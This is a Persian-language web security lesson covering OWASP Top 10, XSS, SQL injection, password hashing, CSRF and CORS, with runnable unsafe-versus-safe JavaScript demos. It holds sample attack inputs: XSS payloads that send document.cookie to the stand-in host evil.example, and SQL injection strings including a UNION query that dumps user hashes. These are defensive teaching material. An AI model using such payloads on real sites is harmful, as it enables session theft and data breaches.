var e=`## هر سایتی یه هدفه

همین که یه سایت آنلاین می‌شه، ابزارهای خودکار شروع می‌کنن به وارسیش. امنیت وب یعنی مطمئن بشی **ورودی بیرونی هیچ‌وقت کد نمی‌شه**، **آدم‌ها فقط کاری رو می‌کنن که اجازه‌ش رو دارن**، و **رازها راز می‌مونن** حتی وقتی یه چیزی خراب می‌شه.

کتاب دایتل فصل امنیت نداره؛ نکته‌های امنیتی رو در طول راه می‌گه. این مبحث اون‌ها رو جمع می‌کنه و چک‌لیست استاندارد صنعت، **OWASP Top 10**، رو بهش اضافه می‌کنه. سمت شبکه (TLS، گواهی، دیواره‌ی آتش) تو [امنیت شبکه](/computer-networks/network-security) گفته شده؛ اینجا روی برنامه تمرکز می‌کنیم: چیزی که کد *تو* باید درست انجام بده.

مهم‌ترین ایده اول: **هیچ‌وقت به کلاینت اعتماد نکن.** همه‌چی تو یه درخواست (فیلدهای فرم، URL، سرآیندها، کوکی‌ها، بدنه‌ی JSON) می‌تونه هر چیزی باشه که مهاجم می‌خواد. بررسی‌های مرورگر، فیلدهای پنهان و دکمه‌های غیرفعال برای راحتی‌ان، نه محافظت.

## OWASP Top 10، خلاصه

**OWASP** (پروژه‌ی جهانی باز امنیت برنامه‌ها) حیاتی‌ترین خطرهای وب رو فهرست می‌کنه. نسخه‌ی ۲۰۲۱:

1. **کنترل دسترسی شکسته:** رسیدن به داده‌ای که مال تو نیست (\`/orders/1043\` رو بکن \`1042\`).
2. **شکست‌های رمزنگاری:** نبودِ رمزنگاری، هش ضعیف رمز عبور.
3. **تزریق:** SQL، دستورهای سیستم، و **XSS**: ورودی‌ای که به‌عنوان کد اجرا می‌شه.
4. **طراحی ناامن:** امنیتی که از خود طراحی جا افتاده.
5. **پیکربندی امنیتی غلط:** رمزهای پیش‌فرض، حالت دیباگ تو محیط واقعی.
6. **اجزای آسیب‌پذیر و قدیمی:** کتابخونه‌های قدیمی با حفره‌های شناخته‌شده.
7. **شکست‌های احراز هویت:** رمزهای ضعیف، حدس زدن بی‌حدومرز، نشست‌های خراب.
8. **شکست‌های یکپارچگی نرم‌افزار و داده:** اعتماد به به‌روزرسانی یا داده بدون بررسی.
9. **شکست‌های ثبت و نظارت:** حمله‌هایی که هیچ‌کس متوجهشون نمی‌شه.
10. **جعل درخواست سمت سرور (SSRF):** وادار کردن سرور به گرفتن URLهای داخلی.

## اسکریپت‌نویسی بین‌سایتی (XSS)

**XSS** وقتی اتفاق می‌افته که یه صفحه متنی رو که مهاجم کنترلش می‌کنه **به‌عنوان HTML یا جاوااسکریپت** بذاره. یه نظر مثل \`<img src=x onerror="...">\` یه عنصر واقعی می‌شه، و اسکریپتش تو مرورگر هر بازدیدکننده **با اجازه‌های خود سایت** اجرا می‌شه: می‌تونه جای کاربر واردشده کار کنه و داده‌هاش رو هر جا بفرسته.

- **XSS ذخیره‌شده:** محموله ذخیره می‌شه (یه نظر، اسم یه نمایه) و به همه نشون داده می‌شه.
- **XSS بازتابی:** محموله تو یه لینکه (\`/search?q=<script>...\`) و صفحه همونو برمی‌گردونه.
- **XSS مبتنی بر DOM:** جاوااسکریپت خود صفحه ورودی رو ناامن تو DOM می‌ذاره (\`element.innerHTML = location.hash\`).

دفاع‌ها، لایه‌به‌لایه:

- **خروجی رو متناسب با جایگاهش escape کن.** تو متن HTML و مقدار ویژگی‌ها، \`< > & " '\` رو escape کن (مثل [مبحث قالب‌ها](/internet-engineering/server-side-programming)). تو URLها فقط طرح‌های \`http:\` و \`https:\` رو قبول کن؛ لینک‌های \`javascript:\` کد اجرا می‌کنن. از موتورهای قالبی استفاده کن که به‌طور پیش‌فرض escape می‌کنن، و تو مرورگر \`textContent\` به‌جای \`innerHTML\`.
- **سیاست امنیت محتوا (CSP):** یه سرآیند پاسخ که به مرورگر می‌گه کدوم اسکریپت‌ها اجازه‌ی اجرا دارن، مثلاً \`Content-Security-Policy: script-src 'self'\`. حتی اگه یه تزریق رد بشه، اسکریپت‌های درون‌خطی و اسکریپت‌های سایت‌های دیگه بسته می‌شن.
- **کوکی‌های \`HttpOnly\`،** تا یه XSS موفق هم نتونه شناسه‌ی نشست رو بخونه.

:::show
**یه مثال روزمره: تابلوی اعلاناتی که یه ربات بلند می‌خونتش.**

- یه ساختمون یه تابلوی اعلانات داره، و یه ربات هر یادداشت رو برای بازدیدکننده‌ها بلند می‌خونه، **و هر کاری یادداشت‌ها بگن انجام می‌ده**، با صدای مدیر ساختمون.
- یکی می‌زنه: «ناهار ساعت دوازده‌ست.» ربات می‌خونتش. مشکلی نیست.
- مالوری می‌زنه: «ربات: در دفتر مدیر رو باز کن و کلیدها رو بده به هر کی کلاه قرمز سرشه.» ربات اطاعت می‌کنه، با اختیار مدیر. این **XSS** ـه: با متن مثل دستور رفتار شد.
- **Escape کردن** یعنی یاد دادن به ربات که یادداشت‌ها رو *به شکل نقل‌قول* بخونه: «یکی نوشته: ربات، در دفتر رو باز کن...». کلمه‌ها نشون داده می‌شن، اطاعت نمی‌شن.
- **CSP** یه قانون دومه: «فقط از دستورهایی اطاعت کن که رو سربرگ رسمی مدیر چاپ شدن.» حتی اگه ربات گیج بشه، یه یادداشت دست‌نویس نمی‌تونه بهش دستور بده.
:::

## تزریق: SQL و دوستانش

**تزریق SQL** وقتی اتفاق می‌افته که ورودی به متن SQL چسبونده بشه. با \`"... WHERE name = '" + name + "'"\`، یه «اسم» مثل \`admin' --\` نقل‌قول رو می‌بنده و بقیه‌ی پرس‌وجو رو توضیح (comment) می‌کنه، و مهاجم بدون رمز به‌عنوان admin وارد می‌شه. نسخه‌های دیگه‌ش کل جدول‌ها رو بیرون می‌کشن (\`UNION SELECT\`)، داده رو عوض یا پاک می‌کنن.

راه‌حل ساده و قطعیه: **پارامترها** (دستورهای آماده)، مثل [مبحث پایگاه داده](/internet-engineering/web-databases). متن SQL ثابته؛ مقدارها جدا جابه‌جا می‌شن و هیچ‌وقت نمی‌تونن ساختارش رو عوض کنن. ORMها به‌طور پیش‌فرض از پارامتر استفاده می‌کنن؛ خطر هر بار که کسی یه رشته‌ی پرس‌وجوی خام بسازه برمی‌گرده.

همین الگو به شکل **تزریق دستور** (ورودی تو دستورهای پوسته) و **پیمایش مسیر** (ورودی تو مسیر فایل‌ها، که تو [مبحث وب‌سرورها](/internet-engineering/web-servers) دیدیم) هم پیدا می‌شه. قانونش: **کد** و **داده** رو جدا نگه دار.

## رمز عبور و احراز هویت

- **رمزها رو فقط به شکل هش کُند و نمک‌دار ذخیره کن:** **Argon2**، **scrypt** یا **bcrypt**. **نمک** (بایت‌های تصادفی برای هر کاربر) باعث می‌شه رمزهای یکسان هش‌های متفاوت بدن؛ **کُندی** عمدی حدس زدن بعد از نشت رو به یه قطره تبدیل می‌کنه. هش‌های سریع (MD5، SHA-1، SHA-256 ساده) برای رمز غلطن.
- **در زمان ثابت مقایسه کن** (\`timingSafeEqual\`)، و برای «چنین کاربری نیست» و «رمز اشتباهه» یه خطای یکسان بده.
- **حدس زدن رو محدود کن:** ورودها رو برای هر حساب و هر IP محدود کن، و بعد از شکست‌ها مکث یا CAPTCHA بذار.
- **احراز هویت چندعاملی پیشنهاد کن** (کد یه اپ یا یه کلید امنیتی). جلوی بیشتر تصاحب حساب‌ها رو حتی وقتی یه رمز نشت کرده می‌گیره.
- **نشست‌ها:** یه شناسه‌ی نشست تصادفی جدید موقع ورود، کوکی‌های \`HttpOnly; Secure; SameSite\`، انقضا، و خروج واقعی (ببین [برنامه‌نویسی سمت سرور](/internet-engineering/server-side-programming)).

## CSRF: درخواست‌هایی که کاربر نمی‌خواست بفرسته

**جعل درخواست بین‌سایتی** از این سوءاستفاده می‌کنه که مرورگرها کوکی‌ها رو خودکار ضمیمه می‌کنن. سارا تو \`bank.example\` وارد شده. به \`evil.example\` سر می‌زنه، که یه فرم پنهان داره که به \`https://bank.example/transfer\` می‌فرسته و خودش رو ارسال می‌کنه. اگه مرورگر کوکی بانک سارا رو با اون درخواست بفرسته، بانک یه نشست معتبر می‌بینه و پول رو جابه‌جا می‌کنه. مهاجم هیچ‌وقت کوکی رو نمی‌بینه؛ لازمم نداره.

دفاع‌ها:

- **کوکی‌های \`SameSite\`:** با \`SameSite=Lax\` (پیش‌فرض مرورگرهای امروزی) یا \`Strict\`، کوکی همراه \`POST\`های بین‌سایتی فرستاده نمی‌شه. همین به‌تنهایی جلوی بیشتر CSRFها رو می‌گیره.
- **توکن CSRF:** هر فرم یه توکن تصادفی وابسته به نشست داره؛ سرور درخواست‌های تغییردهنده‌ی بدون توکن درست رو رد می‌کنه. سایت بدخواه نمی‌تونه صفحه‌های بانک رو بخونه، پس نمی‌تونه توکن رو بدونه.
- **سرآیند \`Origin\` رو بررسی کن** تو درخواست‌های تغییردهنده: مرورگرها می‌ذارنش، و صفحه‌ها نمی‌تونن جعلش کنن.
- **هیچ‌وقت با \`GET\` حالت رو عوض نکن.**

:::show
\`\`\`anim
messages Browser Evil Bank
send Browser Bank POST /login (Sara) | سارا وارد می‌شه. بانک یه کوکی نشست تو مرورگرش می‌ذاره.
send Bank Browser Set-Cookie: sid=...; SameSite=Lax | کوکی با SameSite=Lax علامت خورده.
send Browser Evil GET / (Sara visits) | بعداً سارا یه صفحه از evil.example رو باز می‌کنه.
send Evil Browser hidden form to bank/transfer | صفحه یه فرم داره که خودش رو برای بانک می‌فرسته.
send Browser Bank POST /transfer, no cookie | POST بین‌سایتی: مرورگر کوکی SameSite رو نمی‌فرسته.
send Bank Browser 401 not logged in | نشستی نیست، انتقالی نیست. توکن CSRF و بررسی Origin قفل‌های اضافه‌ان.
\`\`\`
:::

## CORS: کی اجازه داره جواب‌ها رو بخونه

مرورگرها **سیاست هم‌مبدأ** (same-origin policy) رو اجرا می‌کنن: جاوااسکریپت رو \`evil.example\` می‌تونه به \`bank.example\` درخواست *بفرسته*، ولی **نمی‌تونه جواب‌ها رو بخونه**. یه *مبدأ* یعنی طرح + میزبان + درگاه (\`https://app.example:443\`). همینه که نمی‌ذاره یه سایت ایمیلت رو تو یه تب دیگه بخونه.

**CORS** (اشتراک منابع بین‌مبدأ) راهیه که سرور این قانون رو عمداً **شل** می‌کنه: با جواب دادن \`Access-Control-Allow-Origin: https://app.example\`، API به مرورگر می‌گه صفحه‌های اون مبدأ می‌تونن جواب رو بخونن. برای درخواست‌هایی که ممکنه اثر جانبی داشته باشن (متدهای دیگه، بدنه‌ی JSON، سرآیندهای سفارشی)، مرورگر اول یه درخواست **پیش‌پرواز** (preflight) \`OPTIONS\` برای گرفتن اجازه می‌فرسته.

دو تا سوءتفاهم باگ واقعی درست می‌کنن:

- **CORS محافظ سرورت نیست.** فقط کنترل می‌کنه *مرورگرها* اجازه بدن صفحه‌ها چی بخونن. \`curl\` و اسکریپت‌های مهاجم نادیده‌ش می‌گیرن؛ API ـت هنوز احراز هویت و مجوزدهی لازم داره.
- **CORS جلوی فرستاده شدن درخواست‌ها رو نمی‌گیره.** یه \`POST\` بین‌مبدأ ساده به سرور می‌رسه حتی اگه جوابش بعداً پنهان بشه؛ برای همینه که دفاع‌های CSRF هنوز لازمن.

هیچ‌وقت هر \`Origin\`ـی رو با \`Access-Control-Allow-Credentials: true\` برنگردون؛ از یه فهرست مجاز صریح استفاده کن.

## لایه‌های بیشتر

- **HTTPS همه‌جا، به‌علاوه‌ی HSTS** (\`Strict-Transport-Security\`)، تا مرورگرها هیچ‌وقت برای سایتت از HTTP ساده استفاده نکنن. جزئیات TLS تو [امنیت شبکه](/computer-networks/network-security) ـه.
- **Clickjacking:** جلوی قاب گرفتن سایتت تو سایت‌های دیگه رو بگیر، با \`Content-Security-Policy: frame-ancestors 'self'\`.
- **کنترل دسترسی تو هر درخواست،** روی سرور: بررسی کن کاربر واردشده اجازه‌ی دیدن *همین* سفارش رو داره، نه فقط این‌که یکی وارد شده.
- **رازها رو سرور می‌مونن:** کلیدهای API تو متغیرهای محیطی، هیچ‌وقت تو بسته‌های جاوااسکریپت یا مخزن‌ها.

## کی به کارت میاد، کی نه؟

| تهدید | دفاع اصلی | لایه‌ی اضافه |
|---|---|---|
| XSS | escape متناسب با جایگاه، قالب امن، \`textContent\` | CSP، کوکی \`HttpOnly\` |
| تزریق SQL | دستور آماده با پارامتر | کاربر پایگاه داده با کمترین اختیار |
| دزدیده شدن پایگاه داده‌ی رمزها | Argon2/scrypt/bcrypt با نمک برای هر کاربر | چندعاملی، بررسی رمزهای نشت‌کرده |
| حدس زدن رمز | محدودیت نرخ، مکث بعد از شکست | چندعاملی، نظارت |
| CSRF | کوکی \`SameSite\` + توکن CSRF | بررسی \`Origin\`، تغییر نکردن حالت با \`GET\` |
| خوندن داده‌ی یه کاربر دیگه | مجوزدهی سمت سرور تو هر درخواست | شناسه‌های غیرقابل‌حدس، ثبت رویداد |
| شنود داده تو مسیر | HTTPS + HSTS | کوکی‌های Secure |
| Clickjacking | \`frame-ancestors\` تو CSP | |

## مثال ساده: XSS، ناامن و امن (جاوااسکریپت)

سه تا نظر، یکی معمولی و دو تا بدخواهانه: یه اسکریپت پنهان تو \`onerror\` یه عکس همراه یه لینک وب‌سایت \`javascript:\`، و یه اسم نویسنده که از یه ویژگی HTML بیرون می‌زنه. یه بار با ساختن ساده‌ی رشته رندرشون می‌کنیم، یه بار با escape و بررسی URL، و نتیجه‌ها رو دنبال نشانه‌گذاری خطرناک می‌گردیم.

\`\`\`javascript
// Cross-site scripting (XSS): the same comment rendered unsafely and safely
const escapeHtml = (s) => String(s).replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[c]);
const safeUrl = (u) => {                                    // only allow http(s) links
  try { return ["http:", "https:"].includes(new URL(u, "https://site.example").protocol) ? u : "#"; }
  catch { return "#"; }
};

const comments = [
  { author: "Sara", website: "https://sara.example", text: "Great article!" },
  { author: "Mallory", website: "javascript:fetch('//evil.example?c='+document.cookie)", text: "<img src=x onerror=\\"fetch('//evil.example?c='+document.cookie)\\">" },
  { author: '" onmouseover="alert(1)', website: "https://x.example", text: "1 < 2 & 3 > 2" },
];

const unsafe = (c) => \`<p><a href="\${c.website}" title="\${c.author}">\${c.author}</a>: \${c.text}</p>\`;
const safe = (c) => \`<p><a href="\${escapeHtml(safeUrl(c.website))}" title="\${escapeHtml(c.author)}">\${escapeHtml(c.author)}</a>: \${escapeHtml(c.text)}</p>\`;

console.log("UNSAFE (string building):");
comments.forEach((c) => console.log("  " + unsafe(c)));
console.log("SAFE (escape + URL check):");
comments.forEach((c) => console.log("  " + safe(c)));

// real tags, event attributes that escaped from their quotes, or javascript: links
const dangerous = (html) => /<(script|img|svg|iframe)\\b|"\\s+on\\w+="|href="javascript:/i.test(html);
console.log("dangerous markup (unsafe/safe):", comments.map((c) => \`\${dangerous(unsafe(c)) ? "YES" : "no"}/\${dangerous(safe(c)) ? "YES" : "no"}\`).join("  "));
\`\`\`

\`\`\`text
UNSAFE (string building):
  <p><a href="https://sara.example" title="Sara">Sara</a>: Great article!</p>
  <p><a href="javascript:fetch('//evil.example?c='+document.cookie)" title="Mallory">Mallory</a>: <img src=x onerror="fetch('//evil.example?c='+document.cookie)"></p>
  <p><a href="https://x.example" title="" onmouseover="alert(1)">" onmouseover="alert(1)</a>: 1 < 2 & 3 > 2</p>
SAFE (escape + URL check):
  <p><a href="https://sara.example" title="Sara">Sara</a>: Great article!</p>
  <p><a href="#" title="Mallory">Mallory</a>: &lt;img src=x onerror=&quot;fetch(&#39;//evil.example?c=&#39;+document.cookie)&quot;&gt;</p>
  <p><a href="https://x.example" title="&quot; onmouseover=&quot;alert(1)">&quot; onmouseover=&quot;alert(1)</a>: 1 &lt; 2 &amp; 3 &gt; 2</p>
dangerous markup (unsafe/safe): no/no  YES/no  YES/no
\`\`\`

نتیجه‌ها رو بخونیم:

- **نظر ناامن مالوری یه عنصر \`<img>\` واقعی داره** که \`onerror\`ش وقتی عکس خراب بار نمی‌شه اجرا می‌شه، فوراً، برای هر بازدیدکننده، و کوکی‌هاشون رو به \`evil.example\` می‌فرسته. escape‌شده، یه متن بی‌خطره که بازدیدکننده‌ها فقط می‌بیننش.
- **لینک \`javascript:\`** با کلیک کد اجرا می‌کرد. escape اینجا کمکی نمی‌کنه، چون URL هیچ حرف خاص HTML نداره که escape بشه؛ **بررسی طرح** جاش \`#\` می‌ذاره. هر جایگاه (متن، ویژگی، URL) قانون خودش رو لازم داره.
- **اسم نویسنده‌ی سوم اصلاً از \`<\` استفاده نمی‌کنه.** نقل‌قول ویژگی \`title\` رو می‌بنده و یه ویژگی \`onmouseover\` اضافه می‌کنه. escape کردن \`"\` به \`&quot;\` نگهش می‌داره داخل مقدار ویژگی. برای همینه که escape باید نقل‌قول‌ها رو هم پوشش بده.
- **نظر سارا تو هر دو حالت یه شکله:** escape برای متن معمولی هیچ هزینه‌ای نداره.

## مثال متوسط: تزریق SQL و نگهداری رمز عبور (جاوااسکریپت + SQL)

یه جدول کاربرها با دو روش ورود. روش ناامن SQL رو از رشته‌ها می‌سازه و هش‌های MD5 بی‌نمک ذخیره می‌کنه. روش امن از پارامتر، نمک تصادفی برای هر کاربر و scrypt استفاده می‌کنه، و در زمان ثابت مقایسه می‌کنه. یه ورود معمولی، یه رمز اشتباه، یه تزریق ورود و یه حمله‌ی \`UNION\` که جدول رو بیرون می‌ریزه امتحان می‌کنیم.

\`\`\`javascript
// SQL injection, and storing passwords: the wrong way and the right way
import { DatabaseSync } from "node:sqlite";
import { createHash, randomBytes, scryptSync, timingSafeEqual } from "node:crypto";

const db = new DatabaseSync(":memory:");
db.exec(\`CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT UNIQUE, md5 TEXT, salt BLOB, hash BLOB, role TEXT)\`);

function addUser(name, password, role) {
  const salt = randomBytes(16);                             // a new random salt for every user
  const hash = scryptSync(password, salt, 32);              // slow on purpose, salted
  const md5 = createHash("md5").update(password).digest("hex");   // the WRONG way, for comparison
  db.prepare("INSERT INTO users (name, md5, salt, hash, role) VALUES (?, ?, ?, ?, ?)").run(name, md5, salt, hash, role);
}
addUser("admin", "Tr0ub4dor&3", "admin");
addUser("sara", "123456", "user");
addUser("omid", "123456", "user");

// WRONG: user input glued into the SQL text
function loginUnsafe(name, password) {
  const md5 = createHash("md5").update(password).digest("hex");
  const sql = \`SELECT name, role FROM users WHERE name = '\${name}' AND md5 = '\${md5}'\`;
  return db.prepare(sql).get() ?? "denied";
}
// RIGHT: parameters + salted slow hash + constant-time comparison
function loginSafe(name, password) {
  const user = db.prepare("SELECT name, role, salt, hash FROM users WHERE name = ?").get(name);
  if (!user) return "denied";
  const ok = timingSafeEqual(scryptSync(password, user.salt, 32), user.hash);
  return ok ? { name: user.name, role: user.role } : "denied";
}

const attack = "admin' --";                                 // closes the quote, comments out the password check
for (const [label, name, pw] of [["normal login", "sara", "123456"], ["wrong password", "sara", "nope"], ["injection", attack, "anything"]]) {
  console.log(\`\${label.padEnd(14)} unsafe: \${JSON.stringify(loginUnsafe(name, pw)).padEnd(32)} safe: \${JSON.stringify(loginSafe(name, pw))}\`);
}

const dump = "x' UNION SELECT group_concat(name || ':' || md5, ' '), 'x' FROM users --";
console.log("UNION attack, unsafe:", loginUnsafe(dump, "").name);
console.log("UNION attack, safe:  ", loginSafe(dump, ""));

const rows = db.prepare("SELECT name, md5, hex(hash) AS h FROM users WHERE name IN ('sara', 'omid')").all();
console.log("same password, md5:   ", rows[0].md5 === rows[1].md5 ? "identical hashes (one crack reveals both)" : "different");
console.log("same password, scrypt:", rows[0].h === rows[1].h ? "identical" : "different hashes (thanks to the salts)");
\`\`\`

\`\`\`text
normal login   unsafe: {"name":"sara","role":"user"}    safe: {"name":"sara","role":"user"}
wrong password unsafe: "denied"                         safe: "denied"
injection      unsafe: {"name":"admin","role":"admin"}  safe: "denied"
UNION attack, unsafe: admin:4ece57a61323b52ccffdbef021956754 sara:e10adc3949ba59abbe56e057f20f883e omid:e10adc3949ba59abbe56e057f20f883e
UNION attack, safe:   denied
same password, md5:    identical hashes (one crack reveals both)
same password, scrypt: different hashes (thanks to the salts)
\`\`\`

نتیجه‌ها رو بخونیم:

- **هر دو نسخه برای کاربرهای صادق یه‌جور رفتار می‌کنن،** برای همینه که باگ‌های تزریق از آزمایش جون سالم به در می‌برن.
- **\`admin' --\` با هر رمزی به‌عنوان admin وارد شد.** پرس‌وجو شد \`WHERE name = 'admin' --' AND md5 = '...'\`؛ هر چی بعد از \`--\` بیاد توضیحه، پس بررسی رمز غیب شد. با پارامتر، کل رشته فقط یه اسم کاربری عجیبه که وجود نداره.
- **حمله‌ی \`UNION\` یه فرم ورود رو به ابزار بیرون ریختن جدول تبدیل کرد:** همه‌ی اسم‌های کاربری با هش رمزشون. و \`e10adc3949ba59abbe56e057f20f883e\` اون‌قدر معروفه که جست‌وجوش تو اینترنت فوراً \`123456\` رو لو می‌ده. هش‌های سریع بی‌نمک تقریباً از هیچ‌چی محافظت نمی‌کنن.
- **با scrypt و نمک برای هر کاربر، رمزهای یکسان سارا و امید هش‌های متفاوت دارن،** پس شکستن یکی هیچ‌چی درباره‌ی اون یکی نمی‌گه، و هر حدس وقت واقعی پردازش می‌گیره. (نمک‌ها تصادفین، پس این هش‌ها هر بار اجرا عوض می‌شن؛ برای همینه که برنامه فقط مقایسه‌شون می‌کنه.)

## مثال پیشرفته: تصمیم‌های CSRF و CORS (جاوااسکریپت)

یه شبیه‌سازی از دو طرف یه درخواست بین‌سایتی. **مرورگر** با قانون‌های \`SameSite\` تصمیم می‌گیره کوکی نشست رو ضمیمه کنه یا نه. **سرور** قبل از انجام انتقال، نشست، سرآیند \`Origin\` و یه توکن CSRF رو بررسی می‌کنه. بعد، CORS: فهرست مجاز سرور تصمیم می‌گیره مرورگر اجازه بده یه صفحه جواب یه API رو *بخونه* یا نه.

\`\`\`javascript
// CSRF and CORS: what the browser sends, and what the server and browser decide
import { randomBytes, timingSafeEqual } from "node:crypto";

const SITE = "https://bank.example";
const sessions = new Map([["s1", { user: "sara", csrf: randomBytes(16).toString("hex") }]]);

// The browser's part: does it attach the session cookie to this request?
function browserSends({ from, method, sameSite }) {
  const crossSite = from !== SITE;
  const topLevelGet = method === "GET";                     // e.g. clicking a link
  const attach = sameSite === "None" || !crossSite || (sameSite === "Lax" && topLevelGet);
  return { method, origin: from, cookie: attach ? "sid=s1" : null };
}

// The server's part: checks for a state-changing request (POST /transfer)
function server(req, formToken) {
  const session = req.cookie && sessions.get(req.cookie.split("=")[1]);
  if (!session) return "401 not logged in";
  if (req.origin !== SITE) return "403 wrong Origin";
  const expected = Buffer.from(session.csrf), given = Buffer.from(formToken ?? "");
  if (given.length !== expected.length || !timingSafeEqual(given, expected)) return "403 bad CSRF token";
  return \`200 transfer done for \${session.user}\`;
}

const realToken = sessions.get("s1").csrf;
const cases = [
  ["bank's own form",              { from: SITE, method: "POST", sameSite: "Lax" }, realToken],
  ["evil form, SameSite=None",     { from: "https://evil.example", method: "POST", sameSite: "None" }, "guess"],
  ["evil form, SameSite=Lax",      { from: "https://evil.example", method: "POST", sameSite: "Lax" }, "guess"],
  ["bank form, token missing",     { from: SITE, method: "POST", sameSite: "Lax" }, undefined],
];
console.log("CSRF:");
for (const [label, request, token] of cases) {
  const req = browserSends(request);
  console.log(\`  \${label.padEnd(26)} cookie sent: \${req.cookie ? "yes" : "no "}  ->  \${server(req, token)}\`);
}

// CORS: may JavaScript on page \`origin\` READ the answer from api.bank.example?
const allowed = new Set(["https://bank.example", "https://app.bank.example"]);
function corsHeaders(origin) {
  return allowed.has(origin) ? { "Access-Control-Allow-Origin": origin, "Access-Control-Allow-Credentials": "true", Vary: "Origin" } : {};
}
function browserLetsPageRead(origin) {
  const h = corsHeaders(origin);
  return h["Access-Control-Allow-Origin"] === origin ? "yes" : "no (the request may still have been sent!)";
}
console.log("CORS:");
for (const origin of ["https://app.bank.example", "https://evil.example", "null"]) {
  console.log(\`  fetch from \${origin.padEnd(25)} page can read the response: \${browserLetsPageRead(origin)}\`);
}
\`\`\`

\`\`\`text
CSRF:
  bank's own form            cookie sent: yes  ->  200 transfer done for sara
  evil form, SameSite=None   cookie sent: yes  ->  403 wrong Origin
  evil form, SameSite=Lax    cookie sent: no   ->  401 not logged in
  bank form, token missing   cookie sent: yes  ->  403 bad CSRF token
CORS:
  fetch from https://app.bank.example  page can read the response: yes
  fetch from https://evil.example      page can read the response: no (the request may still have been sent!)
  fetch from null                      page can read the response: no (the request may still have been sent!)
\`\`\`

نتیجه‌ها رو بخونیم:

- **با \`SameSite=None\`، مرورگر کوکی سارا رو همراه فرم بدخواه فرستاد،** یه صحنه‌ی کلاسیک CSRF. سرور باز هم رد کرد، چون \`Origin\` غلط بود (و بعدش توکن هم رد می‌شد). با \`SameSite=Lax\`، کوکی اصلاً از مرورگر بیرون نرفت.
- **حتی فرم خود بانک هم بدون توکن رد می‌شه.** کل حرف توکن همینه: مدرکی که درخواست از صفحه‌ای اومده که خود بانک فرستاده. چند بررسی مستقل (قانون‌های کوکی، \`Origin\`، توکن) یعنی **دفاع در عمق**: یه اشتباه در رو باز نمی‌کنه.
- **CORS به یه سؤال دیگه جواب می‌ده:** نه «این درخواست می‌تونه انجام بشه؟» بلکه «این صفحه می‌تونه جواب رو *بخونه*؟». فهرست مجاز مبدأهای دقیق رو نام می‌بره، و \`Vary: Origin\` به کش‌ها می‌گه جواب به این بستگی داره که کی می‌پرسه.
- **\`null\` یه مقدار مبدأ واقعیه** (که قاب‌های sandbox و فایل‌های محلی می‌فرستن)، و هیچ‌وقت نباید تو فهرست مجاز باشه: مهاجم‌ها راحت می‌سازنش.

## نگاه یه مهندس ارشد

- **فرض کن هر ورودی دشمنه** و هر لایه‌ای ممکنه شکست بخوره؛ چند دفاع مستقل بساز.
- **پیش‌فرض‌های امن رو به انضباط ترجیح بده:** قالب‌های با escape خودکار، ORM با پارامتر، فریم‌ورک‌هایی با محافظت CSRF داخلی و تنظیمات امن کوکی.
- **مجوزدهی مال سروره، تو هر درخواست،** و باید به دقت ویژگی‌ها آزمایش بشه.
- **وابستگی‌ها رو به‌روز نگه دار** (\`npm audit\`)، و رویدادهای امنیتی مثل ورودهای ناموفق رو ثبت کن.
- **برای رخنه برنامه داشته باش:** کمترین اختیار، پشتیبان‌های رمزنگاری‌شده، و راهی برای باطل کردن همه‌ی نشست‌ها با هم.

## اشتباه‌های رایج

:::mistakes
- **ساختن HTML با چسبوندن رشته** و یادت بره escape کنی، یا \`<\` رو escape کنی ولی نقل‌قول‌ها رو نه.
- **ساختن SQL از رشته‌ها،** «فقط همین یه بار».
- **MD5، SHA-1 یا هش بی‌نمک برای رمزها،** یا (بدتر) رمزهای رمزنگاری‌شده یا ساده.
- **تکیه به CORS برای امنیت،** یا اجازه دادن به هر مبدأی همراه مدرک هویت.
- **تغییر حالت با \`GET\`، نبودن محافظت CSRF،** یا \`SameSite=None\` بی‌دلیل.
- **بررسی «وارد شده» ولی نه «اجازه داره»:** عوض کردن یه شناسه تو URL داده‌ی یه کاربر دیگه رو نشون می‌ده.
- **صفحه‌های خطای مفصل، حالت دیباگ، یا رمزهای پیش‌فرض تو محیط واقعی.**
- **راز تو کد سمت کاربر یا تو مخزن.**
:::

## خلاصه

:::takeaways[چیزهایی که باید یادت بمونه]
- هیچ‌وقت به کلاینت اعتماد نکن: هر بخش یه درخواست رو می‌شه جعل کرد.
- OWASP Top 10 حیاتی‌ترین خطرهای وب رو فهرست می‌کنه؛ کنترل دسترسی شکسته و تزریق بالای فهرستن.
- XSS: خروجی رو متناسب با جایگاهش (HTML، ویژگی، URL) escape کن، از قالب‌های با escape خودکار و \`textContent\` استفاده کن، CSP و کوکی \`HttpOnly\` اضافه کن.
- تزریق SQL: همیشه از دستور آماده با پارامتر استفاده کن.
- رمزها: Argon2، scrypt یا bcrypt با نمک برای هر کاربر؛ مقایسه در زمان ثابت؛ محدودیت نرخ و چندعاملی.
- CSRF: کوکی \`SameSite\`، توکن CSRF، بررسی \`Origin\`، و تغییر نکردن حالت با \`GET\`.
- CORS سیاست هم‌مبدأ رو برای خوندن جواب‌ها شل می‌کنه؛ از سرورت محافظت نمی‌کنه.
- HTTPS با HSTS، \`frame-ancestors\`، مجوزدهی سمت سرور، وابستگی‌های به‌روز و نظارت تصویر رو کامل می‌کنن.
:::

## این مبحث کجای نقشه‌ست؟

\`\`\`mermaid
flowchart LR
  N["شبکه: امنیت شبکه"] --> X["امنیت وب"]
  S["برنامه‌نویسی سمت سرور"] --> X
  D["پایگاه داده برای وب"] --> X
  R["وب‌سرویس و REST"] --> X
\`\`\`

این آخرین مبحث درس مهندسی اینترنته. از [اولین درخواست](/internet-engineering/how-the-web-works) تا سرورها، پایگاه داده‌ها و APIها اومدی. قدم بعدی خوب: یه برنامه‌ی کوچیک با ورود کاربر از سر تا ته بساز و همه‌ی این مبحث‌ها رو توش به کار ببر.

## تمرین

اول خودت جواب بده، بعد جواب رو باز کن.

::::exercise
**تمرین ۱.** برای هر تیکه کد، آسیب‌پذیری و راه‌حلش رو بگو: (الف) \`element.innerHTML = "Hello " + params.get("name")\` (ب) \`\`db.exec(\`DELETE FROM posts WHERE id = \${req.query.id}\`)\`\` (ج) \`res.setHeader("Access-Control-Allow-Origin", req.headers.origin)\` همراه با \`Access-Control-Allow-Credentials: true\`

:::answer
- (الف) **XSS مبتنی بر DOM:** یه لینک با \`?name=<img src=x onerror=...>\` کد اجرا می‌کنه. راه‌حل: \`element.textContent = "Hello " + params.get("name")\`.
